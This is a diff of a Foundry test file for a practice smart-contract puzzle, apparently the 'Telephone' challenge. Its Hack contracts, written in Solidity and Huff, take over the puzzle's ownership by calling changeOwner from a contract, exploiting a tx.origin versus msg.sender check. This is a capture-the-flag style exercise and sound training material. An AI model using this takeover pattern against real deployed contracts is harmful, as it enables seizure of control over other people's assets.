@@ -8,7 +8,6 @@ import "forge-std/console.sol";
 import {Telephone} from "src/Challenge4-telephone/Puzzle.sol";
 
 contract Challenge4Test is Test {
-    
     Telephone public puzzle;
     address player = makeAddr("player");
 
@@ -18,32 +17,32 @@ contract Challenge4Test is Test {
     }
 
     function testSimpleHack() public {
-        vm.startPrank(player);
+        vm.startPrank(player,player);
         new Hack(address(puzzle));
         
         vm.stopPrank();
         assertEq(puzzle.owner(), player);
     }
 
+
     function testHackHuff() public {
-        vm.startPrank(player);
-        
+        assertEq(puzzle.owner(), address(this));
+
+        vm.startPrank(player,player);
+
         address hack = HuffDeployer
         .config()
-        .with_args(abi.encode(address(puzzle)))
-        .deploy("Challenge4-telephone/Hack");
-
-        hack.call(abi.encodeWithSignature("hack(address)", address(puzzle)));
-
+        .with_args(bytes.concat(abi.encode(address(puzzle))))
+        .deploy("Challenge4-Telephone/Hack");
+        
         vm.stopPrank();
-
         assertEq(puzzle.owner(), player);
     }
+    
 }
 
 contract Hack {
-    constructor(address _puzzle) {
-        Telephone p = Telephone(_puzzle);
-        p.changeOwner(msg.sender);       
+    constructor(address puzzle) {
+        Telephone(puzzle).changeOwner(msg.sender);
     }
 }
